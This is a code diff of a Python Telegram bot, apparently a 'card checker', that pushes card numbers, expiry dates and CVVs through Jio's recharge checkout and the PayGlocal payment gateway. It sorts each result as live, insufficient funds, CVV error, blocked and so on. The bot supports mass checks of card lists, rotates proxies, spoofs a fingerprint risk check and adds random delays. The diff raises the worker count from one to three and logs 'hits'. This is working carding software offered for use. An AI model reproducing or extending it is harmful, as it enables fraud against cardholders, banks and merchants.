+                       "Sec-Fetch-Site":"cross-site","Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}),
+                data=ed, allow_redirects=True)
+        except Exception as e:
+            return "error", f"Bank connect failed: {str(e)[:80]}", meta
+
+        txt = r.text.lower()
+        url_lower = r.url.lower()
+        if "3dsecure" in txt or "authentication" in txt or "otp" in txt or "3ds" in url_lower:
+            return "3ds", "3DS required", meta
+        if "insufficient" in txt or "not enough funds" in txt or "low balance" in txt:
+            return "insufficient", "Insufficient Funds (bank page)", meta
+        if "declined" in txt or "do not honor" in txt:
+            dm = re.search(r'(declined[^<]{0,80}|do not honor[^<]{0,80})', txt)
+            return _classify_decline("ISSUER_DECLINE", dm.group(1) if dm else "Declined by issuer", ""), meta
+
+        m = re.search(r'x-gl-token=([^&\s"\'\\]+)', r.url + r.text)
+        if not m:
+            return "failed", "Bank redirect failed", meta
+        gl_token = m.group(1)
+        gl_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"
+
+        # 12. PG redirect
+        try:
+            r = sget("https://api.payglocal.com/gl/v2/payments/redirect/dc",
+                params={"x-gl-token": gl_token},
+                headers=ph(gl_ref, extra={"x-gl-current-host":"api.payglocal.com",
+                    "x-gl-gid":"gl_payflow-ui","x-gl-pb-tag-id":"",
+                    "x-gl-previous-host":"https://pay.easebuzz.in/","x-gl-referrer-mismatch":"false",
+                    "x-gl-trusted-referrer":"https://pay.easebuzz.in"}))
+            if r.status_code != 200:
+                return "error", f"PG redirect {r.status_code}", meta
+        except Exception as e:
+            return "error", f"PG redirect failed: {str(e)[:80]}", meta
+
+        # 13. Payment init
+        try:
+            r = spost("https://api.payglocal.com/gl/v2/payments/pd/paynow",
+                params={"x-gl-token": gl_token},
+                headers=ph(gl_ref, ct="application/json", origin="https://api.payglocal.com"),
+                json={"isEnc":"false","payload":{"customerCurrency":"INR","saveCurrencyPreference":False,
+                    "browserDetails":{"colorDepth":sc["depth"],"javaEnabled":False,"javaScripEnabled":True,
+                        "language":lg.split(",")[0],"screenHeight":sc["h"],"screenWidth":sc["w"],"timeZone":-330},
+                    "billingData":{"addressCountry":"FR"},"shippingData":{},"agreedOnTnCs":True}})
+            if r.status_code != 200:
+                return "error", f"Paynow {r.status_code}", meta
+        except Exception as e:
+            return "error", f"Paynow failed: {str(e)[:80]}", meta
+
+        # 14. Risk check
+        try:
+            r = spost("https://api.payglocal.com/gl/v1/payments/risk/fp",
+                params={"x-gl-token": gl_token},
+                headers=ph(gl_ref, ct="application/json", origin="https://api.payglocal.com"),
+                json={"requestId":f"{ts()}.{random.randint(100000,999999)}",
+                      "visitorId":"Y8c4sEunqz0opl0b6YAd","visitorFound":True,"confidenceScore":1})
+            kid = r.json().get("data", {}).get("kid", "")
+            if not kid:
+                return "error", "Risk check failed", meta
+        except Exception as e:
+            return "error", f"Risk check failed: {str(e)[:80]}", meta
+
+        # 15. Charge
+        time.sleep(random.uniform(0.5, 1.2))
+        try:
+            r = spost("https://api.payglocal.com/gl/v2/payments/dc/ipay",
+                params={"x-gl-token": gl_token},
+                headers=ph(gl_ref, ct="application/json", origin="https://api.payglocal.com"),
+                json={"isEnc":"false","kid":kid,"payload":{
+                    "cardNumber":CARD_NUM,"expiryMonth":CARD_MM,"expiryYear":CARD_YY,"cvv":CARD_CVV,
+                    "cardHolderName":CARD_NAME,"saveCard":False,
+                    "browserDetails":{"colorDepth":sc["depth"],"javaEnabled":False,"javaScriptEnabled":True,
+                        "language":lg.split(",")[0],"screenHeight":sc["h"],"screenWidth":sc["w"],
+                        "timeZone":-330,"userAgent":UA}}})
+            result = r.json()
+        except Exception as e:
+            return "error", f"Charge failed: {str(e)[:80]}", meta
+
+        status = result.get("status", "")
+        message = result.get("message", "")
+        reason = result.get("reasonCode", "")
+        key, msg = _classify_decline(status, message, reason)
+        return key, msg, meta
+
+    except Exception as e:
+        tb = traceback.format_exc()
+        print(f"[jio] exception:\n{tb}")
+        return "error", f"Check failed: {str(e)[:120]}", meta
+
+# =====================================================================
+# CLASSIFY
+# =====================================================================
+def _classify_decline(status, message, reason):
+    combined = f"{status} {message} {reason}".lower()
+
+    if status in ("SUCCESS", "APPROVED"):
+        return "success", "Recharge successful."
+    if any(k in combined for k in ["3ds", "otp", "authenticate", "challenge"]):
+        return "3ds", "3DS required"
+    if any(k in combined for k in ["insufficient", "not sufficient", "no sufficient",
+                                    "low balance", "not enough funds", "balance not available",
+                                    "fund shortage"]):
+        return "insufficient", f"Insufficient Funds — {message[:80]}"
+    if any(k in combined for k in ["expired", "expiry", "expiration", "card_expired"]):
+        return "expired", f"Card Expired — {message[:80]}"
+    if any(k in combined for k in ["cvv", "cvc", "security code", "invalid_cvv"]):
+        return "invalid_cvv", f"Invalid CVV — {message[:80]}"
+    if any(k in combined for k in ["invalid card", "invalid_card", "card number",
+                                    "invalid_pan", "pan invalid"]):
+        return "invalid_card", f"Invalid Card — {message[:80]}"
+    if any(k in combined for k in ["do not honor", "do_not_honor", "issuer_decline",
+                                    "declined by issuer", "restricted card"]):
+        return "issuer_decline", f"Card Issuer Declined — {message[:80]}"
+    if any(k in combined for k in ["blocked", "stolen", "lost", "pickup", "pick up",
+                                    "card_blocked", "card_restricted"]):
+        return "blocked", f"Card Blocked — {message[:80]}"
+    if any(k in combined for k in ["not permitted", "not allowed", "international",
+                                    "online transaction", "ecommerce disabled",
+                                    "not enabled for online"]):
+        return "not_permitted", f"Not Permitted — {message[:80]}"
+    if any(k in combined for k in ["limit", "exceeded", "over limit", "transaction_limit"]):
+        return "limit_exceeded", f"Limit Exceeded — {message[:80]}"
+    if any(k in combined for k in ["velocity", "too many", "rate limit", "max attempts"]):
+        return "velocity", f"Velocity Limit — {message[:80]}"
+    if any(k in combined for k in ["processor", "network", "timeout", "gateway",
+                                    "system error", "try again", "temporarily"]):
+        return "processor_error", f"Processor Error — {message[:80]}"
+    if status == "ISSUER_DECLINE":
+        return "issuer_decline", f"Card Issuer Declined — {message[:80]}"
+    return "failed", (message or reason or "Declined")[:120]
+
+def classify(st, dt):
+    """For wrapper compatibility."""
+    if st == "requires_action": st = "3ds"
+    return st, dt
+
+# =====================================================================
+# WRAPPER
+# =====================================================================
+def run_check(phone, amount, card, proxy_str=None, timeout=120):
+    """Wrapper — returns 2-tuple (status, message)."""
+    try:
+        with ThreadPoolExecutor(max_workers=1) as ex:
+            future = ex.submit(jio_check, phone, amount, card, proxy_str)
+            try:
+                result = future.result(timeout=timeout)
+            except FuturesTimeout:
+                return "error", f"Timeout after {timeout}s"
+    except Exception as e:
+        return "error", f"Wrapper failed: {str(e)[:120]}"
+
+    if not isinstance(result, tuple) or len(result) < 2:
+        return "error", "Invalid result"
+    status, message = result[0], result[1]
+    if not status:
+        status = "error"
+    if not message:
+        message = "No message"
+    return status, message
+
+# =====================================================================
+# PROXY
+# =====================================================================
+proxy_list = []
+
+def load_proxies():
+    global proxy_list
+    proxy_list = []
+    if os.path.exists(PROXY_FILE):
+        with open(PROXY_FILE, 'r') as f:
+            proxy_list = [l.strip() for l in f if l.strip()]
+    return len(proxy_list)
+
+def save_proxies(proxies):
+    with open(PROXY_FILE, 'w') as f:
+        for p in proxies: f.write(p + '\n')
+    load_proxies()
+
+def get_random_proxy():
+    if not proxy_list: return None
+    return random.choice(proxy_list)
+
+def _proxy_dict_from_string(entry):
+    if not entry: return None
+    try:
+        parts = entry.split(":")
+        if len(parts) == 4:
+            host, port, user, pw = parts
+            url = f"http://{user}:{pw}@{host}:{port}"
+        elif len(parts) == 2:
+            host, port = parts
+            url = f"http://{host}:{port}"
+        else:
+            url = f"http://{entry}"
+        return {"http": url, "https": url}
+    except: return None
 
 # =====================================================================
 # BOT
@@ -519,7 +556,7 @@ PROXY_FILE = 'JioData/proxies.txt'
 ADMIN_LIMIT = 50
 PREMIUM_LIMIT = 15
 FREE_LIMIT = 0
-WORKERS = 1
+WORKERS = 3
 
 ACTIVE_JOBS = {}
 ACTIVE_USERS_MPP = {}
@@ -598,78 +635,7 @@ def remove_premium(tid):
         return True
     except: return False
 
-# =====================================================================
-# PROXY
-# =====================================================================
-proxy_list = []
-
-def load_proxies():
-    global proxy_list
-    proxy_list = []
-    if os.path.exists(PROXY_FILE):
-        with open(PROXY_FILE, 'r') as f:
-            proxy_list = [l.strip() for l in f if l.strip()]
-    return len(proxy_list)
-
-def save_proxies(proxies):
-    with open(PROXY_FILE, 'w') as f:
-        for p in proxies: f.write(p + '\n')
-    load_proxies()
-
-def get_random_proxy():
-    if not proxy_list: return None
-    return random.choice(proxy_list)
-
-def proxy_dict(entry):
-    if not entry: return None
-    try:
-        host, port, user, pw = entry.split(":")
-        return {"server": f"http://{host}:{port}", "username": user, "password": pw}
-    except: return None
-
 load_proxies()
-
-# =====================================================================
-# CLASSIFY
-# =====================================================================
-def classify(st, dt):
-    if st == "requires_action": st = "3ds"
-    low = (dt or "").lower()
-    if st == "failed":
-        if "insufficient" in low: st = "insufficient"
-        elif "expired" in low: st = "expired"
-        elif "cvv" in low or "cvc" in low: st = "invalid_cvv"
-        elif "do not honor" in low or "issuer" in low: st = "issuer_decline"
-        elif "blocked" in low or "stolen" in low or "lost" in low: st = "blocked"
-        elif "not permitted" in low or "international" in low: st = "not_permitted"
-        elif "limit" in low: st = "limit_exceeded"
-        elif "processor" in low or "network" in low or "try again" in low or "timeout" in low:
-            st = "processor_error"
-    return st, dt
-
-def run_one_check(phone, amount, card, proxy_str=None, timeout=180):
-    proxy = proxy_dict(proxy_str) if proxy_str else None
-    try:
-        with ThreadPoolExecutor(max_workers=1) as ex:
-            future = ex.submit(jio_checkout, phone, amount, card, proxy=proxy, headless=True)
-            try:
-                res = future.result(timeout=timeout)
-            except FuturesTimeout:
-                return "error", f"Timeout"
-            except Exception as te:
-                if "timeout" in str(te).lower(): return "error", f"Timeout"
-                raise
-    except Exception as e:
-        return "error", f"Failed: {str(e)[:120]}"
-    try:
-        if isinstance(res, tuple) and len(res) >= 2:
-            st, dt = res[0], res[1]
-        else: return "error", "Bad result"
-    except: return "error", "Parse failed"
-    try: return classify(st, dt)
-    except: return "error", "Classify failed"
-
-run_check = run_one_check
 
 # =====================================================================
 # PROXY COMMANDS
@@ -741,14 +707,12 @@ def start(message):
     if is_banned(uid):
         bot.reply_to(message, f"{E['cross']} <b>You are banned.</b>", parse_mode="HTML"); return
     add_user(uid)
-    ready = f"{E['check']} Ready" if _CHROMIUM_READY.is_set() else f"{E['clock']} Installing..."
     rk = "[ADMIN]" if is_admin(uid) else ("[PREMIUM]" if is_premium(uid) else "[FREE]")
     bot.reply_to(message,
         f"{E['fire']} <b>JIO RECHARGE BOT</b> {E['fire']}\n{SEP}\n"
         f"{E['eye']} <b>User</b> ➤ {message.from_user.first_name}\n"
         f"{E['gem']} <b>ID</b> ➤ <code>{uid}</code>\n"
-        f"{E['crown']} <b>Rank</b> ➤ {rk}\n"
-        f"{E['shield']} <b>Browser</b> ➤ {ready}\n{SEP}\n"
+        f"{E['crown']} <b>Rank</b> ➤ {rk}\n{SEP}\n"
         f"{E['bolt']} /jio — Single check\n"
         f"{E['box']} /mjio — Mass check\n"
         f"{E['globe']} /proxy — Manage proxies\n"
@@ -773,27 +737,17 @@ def jio_single(message):
     if not card:
         bot.reply_to(message, f"{E['cross']} <b>Invalid card format.</b>", parse_mode="HTML"); return
 
-    if not _CHROMIUM_READY.is_set():
-        wait_msg = bot.reply_to(message, f"{E['clock']} <b>Chromium warming up (max 90s)...</b>", parse_mode="HTML")
-        if not _CHROMIUM_READY.wait(timeout=90):
-            try: bot.delete_message(message.chat.id, wait_msg.message_id)
-            except: pass
-            bot.reply_to(message, f"{E['cross']} <b>Chromium not ready. Try again.</b>", parse_mode="HTML")
-            return
-        try: bot.delete_message(message.chat.id, wait_msg.message_id)
-        except: pass
-
     msg = bot.reply_to(message,
-        f"{E['clock']} <b>Step 1/5: Launching browser...</b>\n{SEP_THIN}\n"
+        f"{E['clock']} <b>Processing...</b>\n{SEP_THIN}\n"
         f"{E['phone']} <b>Phone</b> ➤ <code>{phone}</code>\n"
         f"{E['money']} <b>Amount</b> ➤ ₹{amount}\n"
         f"{E['card']} <b>Card</b> ➤ <code>{card_label(card)}</code>",
         parse_mode="HTML")
 
-    def update_step(step, text, elapsed):
+    def update_step(text, elapsed):
         try:
             bot.edit_message_text(
-                f"{E['clock']} <b>{step}:</b> {text}\n{SEP_THIN}\n"
+                f"{E['clock']} <b>{text}</b>\n{SEP_THIN}\n"
                 f"{E['phone']} <b>Phone</b> ➤ <code>{phone}</code>\n"
                 f"{E['money']} <b>Amount</b> ➤ ₹{amount}\n"
                 f"{E['card']} <b>Card</b> ➤ <code>{card_label(card)}</code>\n"
@@ -806,7 +760,7 @@ def jio_single(message):
 
     def runner():
         try:
-            st, resp = run_one_check(phone, amount, card, proxy_str=proxy)
+            st, resp = run_check(phone, amount, card, proxy_str=proxy)
             holder["st"] = st; holder["resp"] = resp
         except Exception as e:
             holder["st"] = "error"; holder["resp"] = f"Failed: {str(e)[:120]}"
@@ -815,18 +769,20 @@ def jio_single(message):
     t.start()
 
     stages = [
-        (3,"Step 1/5","Launching browser"),(10,"Step 2/5","Loading Jio page"),
-        (20,"Step 3/5","Fetching plans"),(35,"Step 4/5","Filling card form"),
-        (55,"Step 5/5","Submitting payment"),(80,"Step 5/5","Awaiting bank response"),
+        (2,"Session"),(4,"Number lookup"),(6,"Loading plans"),
+        (9,"Checkout"),(12,"Payment gateway"),(16,"Redirect"),
+        (20,"Pay portal"),(23,"Authorization"),(26,"Card confirm"),
+        (30,"Bank connect"),(35,"PG init"),(38,"Payment init"),
+        (42,"Risk check"),(48,"Charge"),(60,"Awaiting bank response"),
     ]
     start_t = time.time(); shown = set()
     while t.is_alive():
         elapsed = int(time.time() - start_t)
-        for secs, step, text in stages:
+        for secs, text in stages:
             if elapsed >= secs and secs not in shown:
-                shown.add(secs); update_step(step, text, elapsed); break
-        time.sleep(2)
-    t.join(timeout=5)
+                shown.add(secs); update_step(text, elapsed); break
+        time.sleep(1)
+    t.join(timeout=3)
     status = holder["st"] or "error"
     response = holder["resp"] or "No response"
 
@@ -897,16 +853,6 @@ def mjio_mass(message):
             f"OR reply .txt with: <code>/mjio &lt;phone&gt; &lt;amount&gt;</code>",
             parse_mode="HTML"); return
 
-    if not _CHROMIUM_READY.is_set():
-        wait_msg = bot.reply_to(message, f"{E['clock']} <b>Chromium warming up (max 90s)...</b>", parse_mode="HTML")
-        if not _CHROMIUM_READY.wait(timeout=90):
-            try: bot.delete_message(message.chat.id, wait_msg.message_id)
-            except: pass
-            bot.reply_to(message, f"{E['cross']} <b>Chromium not ready. Try again.</b>", parse_mode="HTML")
-            return
-        try: bot.delete_message(message.chat.id, wait_msg.message_id)
-        except: pass
-
     job_id = f"{int(time.time())}{random.randint(100,999)}"
     ACTIVE_JOBS[job_id] = True
     ACTIVE_USERS_MPP[uid] = True
@@ -946,7 +892,7 @@ def mjio_mass(message):
     def worker(card, proxy):
         if not ACTIVE_JOBS.get(job_id): return None
         try:
-            status, response = run_one_check(phone, amount, card, proxy_str=proxy)
+            status, response = run_check(phone, amount, card, proxy_str=proxy)
         except Exception as e:
             tb = traceback.format_exc()
             print(f"[mjio] worker exception:\n{tb}")
@@ -985,7 +931,7 @@ def mjio_mass(message):
             )
             try:
                 bot.send_message(message.chat.id, single, parse_mode="HTML")
-                time.sleep(random.uniform(0.5, 1.0))
+                time.sleep(random.uniform(0.3, 0.8))
             except: pass
 
         try:
@@ -997,14 +943,18 @@ def mjio_mass(message):
     def runner_all():
         was_stopped = False
         try:
-            for c in cards:
-                if not ACTIVE_JOBS.get(job_id):
-                    was_stopped = True; break
-                proxy = get_random_proxy()
-                worker(c, proxy)
+            with ThreadPoolExecutor(max_workers=WORKERS) as ex:
+                futures = []
+                for c in cards:
+                    if not ACTIVE_JOBS.get(job_id):
+                        was_stopped = True; break
+                    proxy = get_random_proxy()
+                    futures.append(ex.submit(worker, c, proxy))
+                for f in futures:
+                    try: f.result()
+                    except: pass
         except Exception as e:
-            tb = traceback.format_exc()
-            print(f"[mjio] runner exception:\n{tb}")
+            print(f"[mjio] runner exception: {e}")
         finally:
             ACTIVE_JOBS.pop(job_id, None)
             ACTIVE_USERS_MPP[uid] = False
@@ -1148,14 +1098,12 @@ def bot_stats(message):
     with open(PREMIUM_FILE, 'r') as f: pc = len(f.read().splitlines())
     with open(BANNED_FILE, 'r') as f: bc = len(f.read().splitlines())
     with open(HITS_FILE, 'r') as f: hc = len(f.read().splitlines())
-    ready = f"{E['check']} Ready" if _CHROMIUM_READY.is_set() else f"{E['clock']} Installing"
     bot.reply_to(message,
         f"{E['chart']} <b>BOT STATISTICS</b>\n{SEP}\n"
         f"{E['check']} <b>Total Hits</b> ➤ {hc}\n"
         f"{E['eye']} <b>Users</b> ➤ {uc}\n"
         f"{E['crown']} <b>Premium</b> ➤ {pc}\n"
         f"{E['cross']} <b>Banned</b> ➤ {bc}\n"
-        f"{E['shield']} <b>Browser</b> ➤ {ready}\n"
         f"{E['box']} <b>Active Jobs</b> ➤ {len(ACTIVE_JOBS)}\n{SEP}",
         parse_mode="HTML")
 
@@ -1163,11 +1111,8 @@ def bot_stats(message):
 # MAIN
 # =====================================================================
 if __name__ == "__main__":
-    print("JIO BOT v8 IS RUNNING...")
+    print("JIO BOT v9 (curl_cffi) IS RUNNING...")
     print(f"[BOOT] Token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
-    print(f"[BOOT] Admin ID: {ADMIN_ID}")
-    _kill_zombie_browsers()
-    print("[BOOT] Zombie browsers cleared")
     while True:
         try:
             bot.polling(non_stop=True, timeout=60)
